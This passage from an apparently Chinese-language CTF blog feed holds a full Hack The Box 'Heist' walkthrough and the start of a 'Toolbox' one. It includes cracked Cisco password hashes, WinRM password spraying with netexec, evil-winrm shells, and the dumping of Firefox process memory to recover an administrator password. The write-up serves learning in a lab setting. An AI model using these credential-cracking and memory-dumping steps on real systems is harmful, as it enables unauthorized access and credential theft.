<td align="left">Flag1</td>
<td align="left">C:\Users\FSmith\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Heist</title>
    <url>/Hackthebox/htb/htb-heist/</url>
    <content><![CDATA[<style>.xphxlxuazecx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="xphxlxuazecx">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>                 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">12</span>:02 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.149
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token operator">|</span> http-title: Support Login Page
<span class="token operator">|</span>_Requested resource was login.php
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T03:46:41
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m26s</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">217.07</span> seconds
</code></pre>

<p>添加本地域名解析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.149  heist.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<p>访问80 端口，点击guest登录</p>
<img src="/Hackthebox/htb/htb-heist/image-20250322122035954.png" class="" title="登录">

<p>点击Attachment，跳转到<code>http://heist.htb/attachments/config.txt</code></p>
<img src="/Hackthebox/htb/htb-heist/image-20250322121508924.png" class="" title="config.txt">

<p>可以获取到用户名和密码hash</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
</code></pre>

<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>破解password7 <code>https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</code></p>
<p>使用hashid 识别hash 类型然后使用hashcat 破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashid <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
Analyzing <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MD5 Crypt 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cisco-IOS<span class="token punctuation">(</span>MD5<span class="token punctuation">)</span> 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> FreeBSD MD5 </code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">500</span>  <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt 
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
<span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent              
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">500</span> <span class="token punctuation">(</span>md5crypt, MD5 <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span>, Cisco-IOS <span class="token variable">$1</span>$ <span class="token punctuation">(</span>MD5<span class="token punctuation">))</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:30 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">13</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:43 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:   267.4 kH/s (7.34ms) @ Accel:128 Loops:125 Thr:32 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3563520</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.84</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3563520 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3538944</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.67</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:875-1000</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: stefy06 -> ssrssr1978</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 49c Util: 65% Core:1771MHz Mem:3504MHz Bus:8</span>

Started: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:29 <span class="token number">2025</span>
Stopped: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:45 <span class="token number">2025</span>
                                                                     </code></pre>

<pre class="language-none"><code class="language-none">rout3r: 0242114B0E143F015F5D1E161713($uperP@ssword)
admin: 02375012182C1A1D751618034F36415408(Q4)sJu\Y8qz*A3?d)
hazard：$1$pdQG$o8nrSzsGXeaduXrjlvKc91(stealth1agent)</code></pre>

<h3 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h3><p>使用netexec 和凭证枚举用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec smb heist.htb  <span class="token parameter variable">-u</span> <span class="token string">"hazard"</span> <span class="token parameter variable">-p</span> <span class="token string">"stealth1agent"</span> --rid-brute 
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent 
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">500</span>: SUPPORTDESK<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">501</span>: SUPPORTDESK<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">503</span>: SUPPORTDESK<span class="token punctuation">\</span>DefaultAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">504</span>: SUPPORTDESK<span class="token punctuation">\</span>WDAGUtilityAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">513</span>: SUPPORTDESK<span class="token punctuation">\</span>None <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1008</span>: SUPPORTDESK<span class="token punctuation">\</span>Hazard <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1009</span>: SUPPORTDESK<span class="token punctuation">\</span>support <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1012</span>: SUPPORTDESK<span class="token punctuation">\</span>Chase <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1013</span>: SUPPORTDESK<span class="token punctuation">\</span>Jason <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
</code></pre>

<h3 id="winrm-爆破"><a href="#winrm-爆破" class="headerlink" title="winrm 爆破"></a>winrm 爆破</h3><p>目标开放了5985 将收集到的所有用户和口令对winrm 进行爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec winrm heist.htb  <span class="token parameter variable">-u</span> user.txt <span class="token parameter variable">-p</span> pass.txt --continue-on-success 
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span>
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:stealth1agent
                                                                                      </code></pre>

<p>使用evil-winrm 登录用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-u</span> Chase  <span class="token parameter variable">-p</span> <span class="token string">'Q4)sJu\Y8qz*A3?d'</span>
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
supportdesk<span class="token punctuation">\</span>chase
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>

    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        <span class="token number">4</span>/22/2019   <span class="token number">9</span>:08 AM            <span class="token number">121</span> todo.txt
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> user.txt</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看进程，发现firefox </p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">*Evil-WinRM* PS C:\Users\Chase&gt; ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    454      17     2264       5332               364   0 csrss
    291      13     2288       5168               480   1 csrss
    357      15     3480      14584              2468   1 ctfmon
    252      14     3936      13428              3832   0 dllhost
    166       9     1824       9748       0.02   6648   1 dllhost
    615      32    30096      57836               980   1 dwm
   1489      57    23924      78568              5088   1 explorer
   1053      69   143248     219100       2.95   6300   1 firefox
    347      19    10232      39812       0.03   6408   1 firefox
    401      33    31456      90444       0.34   6560   1 firefox
    378      28    22220      59020       0.16   6836   1 firefox
    355      25    16376      38944       0.05   7116   1 firefox
     49       6     1516       3872               788   0 fontdrvhost
     49       6     1804       4648               796   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    &lt;...&gt;
    342      16     8352      18156              3972   0 WmiPrvSE
   2264      28    89968     107400       0.70   3004   0 wsmprovhost</code></pre>

<p>上传procdump64.exe 和strings64.exe 对firefox 进行dump</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>procdump64.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-ma</span> <span class="token number">6408</span>

ProcDump v11.0 - Sysinternals process dump utility
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2009</span>-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> initiated: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>firefox.exe_250322_110756.dmp
<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> writing: Estimated dump <span class="token function">file</span> size is <span class="token number">289</span> MB.
<span class="token punctuation">[</span><span class="token number">11</span>:07:57<span class="token punctuation">]</span> Dump <span class="token number">1</span> complete: <span class="token number">289</span> MB written <span class="token keyword">in</span> <span class="token number">1.1</span> seconds
<span class="token punctuation">[</span><span class="token number">11</span>:07:58<span class="token punctuation">]</span> Dump count reached.
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>strings64.exe <span class="token parameter variable">-accepteula</span> firefox.exe_250322_110756.dmp <span class="token operator">></span> firefox.exe_250322_110756.txt 
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> findstr <span class="token string">"password"</span> ./firefox.exe_250322_110756.txt
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
<span class="token assign-left variable">RG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
browser.safebrowsing.passwords.enabled    
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>使用获取到的密码登录目标，获取到管理员权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> heist.htb <span class="token parameter variable">-u</span> administrator  <span class="token parameter variable">-p</span> <span class="token string">'4dD!5&#125;x/re8]FBuZ'</span>  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>

    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> root.txt</code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>C:\Users\Chase\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>敏感信息泄漏</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Toolbox</title>
    <url>/Hackthebox/htb/htb-toolbox/</url>
    <content><![CDATA[<style>.kmqowvxlltro{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="kmqowvxlltro">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.236 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span>  tun0
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-21 <span class="token number">23</span>:36 CST
Warning: <span class="token number">10.10</span>.10.236 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.236
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.18s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           FileZilla ftpd <span class="token number">0.9</span>.60 beta
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>_  SYST: UNIX emulated by FileZilla
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH for_Windows_7.7 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
